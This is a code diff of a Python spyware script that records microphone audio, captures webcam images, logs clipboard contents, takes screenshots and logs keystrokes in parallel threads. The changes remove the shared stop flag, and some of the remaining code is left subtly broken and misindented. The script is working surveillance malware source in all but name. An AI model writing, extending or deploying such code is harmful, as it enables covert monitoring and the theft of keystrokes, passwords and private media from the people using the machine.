@@ -42,8 +42,6 @@ RATE = 48000
 #Initialize PyAudio
 audio = pyaudio.PyAudio()
 
-#Event to control Threads
-stop_thread = threading.Event()
 
 
 ############################################################# RETRIEVE INFORMATION #############################################################
@@ -95,9 +93,8 @@ def Audio():
             wf.setframerate(RATE)
 
             print("Audio recording started. Press 'Esc' to stop.")
-            while not stop_thread.is_set():
-                data = stream.read(CHUNK)
-                wf.writeframes(data)
+            data = stream.read(CHUNK)
+            wf.writeframes(data)
         
         stream.stop_stream()
         stream.close()
@@ -118,8 +115,6 @@ def webcam():
             file = (cam_path + '{}.jpg'.format(x))
             cv2.imwrite(file, img)
             time.sleep(10)
-            if stop_thread.is_set():
-                break  # Break the loop if the stop flag is set
 
         cam.release()  # Properly release the camera
         cv2.destroyAllWindows()  # Close OpenCV windows
@@ -133,18 +128,17 @@ def clipboard():
     previous_clipboard_data = ""  # Store the previous clipboard content
     
     try:
-        while not stop_thread.is_set():
-            win32clipboard.OpenClipboard()
-            pasted_data = win32clipboard.GetClipboardData()
-            win32clipboard.CloseClipboard()
+        win32clipboard.OpenClipboard()
+        pasted_data = win32clipboard.GetClipboardData()
+        win32clipboard.CloseClipboard()
 
-            # Check if clipboard content has changed
-            if pasted_data != previous_clipboard_data:
-                with open(CLIPBOARD, "a") as file:
-                    file.write("Clipboard Data : \n")
-                    file.write(str(pasted_data) + "\n")
-                    file.write("\n")
-                previous_clipboard_data = pasted_data
+        # Check if clipboard content has changed
+        if pasted_data != previous_clipboard_data:
+            with open(CLIPBOARD, "a") as file:
+                file.write("Clipboard Data : \n")
+                file.write(str(pasted_data) + "\n")
+                file.write("\n")
+            previous_clipboard_data = pasted_data
 
             # Add a small delay to avoid high CPU usage
             time.sleep(1)
@@ -157,16 +151,14 @@ def clipboard():
 # Screenshot
 def screenshot():
     try:
-        while not stop_thread.is_set():
-            pathlib.Path(SCREEN).mkdir(parents=True, exist_ok=True)
-            screen_path = 'Screenshots\\'
+        pathlib.Path(SCREEN).mkdir(parents=True, exist_ok=True)
+        screen_path = 'Screenshots\\'
 
-            for x in range(0,10):
-                pic = ImageGrab.grab()
-                pic.save(screen_path + 'screenshot{}.png'.format(x))
-                time.sleep(5)
-                if stop_thread.is_set():
-                    break  # Break the loop if the stop flag is set
+        for x in range(0,10):
+            pic = ImageGrab.grab()
+            pic.save(screen_path + 'screenshot{}.png'.format(x))
+            time.sleep(5)
+
 
     except Exception as e:
         print("Screenshots could not be saved: " + str(e))
@@ -180,16 +172,16 @@ def main():
         setup_logging()
         log_system_info()
         
-        # Start threads for clipboard, webcam, audio recording, and screenshot
-        t2 = threading.Thread(target=clipboard)
-        t3 = threading.Thread(target=webcam)
-        t4 = threading.Thread(target=Audio)
-        t5 = threading.Thread(target=screenshot)
+        # Création des threads
+        t1 = threading.Thread(target=clipboard)
+        t2 = threading.Thread(target=webcam)
+        t3 = threading.Thread(target=Audio)
+        t4 = threading.Thread(target=screenshot)
 
+        t1.start()
         t2.start()
         t3.start()
         t4.start()
-        t5.start()
 
         # Start the keyboard listener to log key presses
         with keyboard.Listener(on_press=on_press) as key_listener:
@@ -202,11 +194,11 @@ def main():
         logging.exception(f"An error occurred: {str(e)}")
     finally:
         # Ensure stop_thread is set and threads are joined
-        stop_thread.set()
+        t1.join()
         t2.join()
         t3.join()
         t4.join()
-        t5.join()
+
 
 
 if __name__ == '__main__':
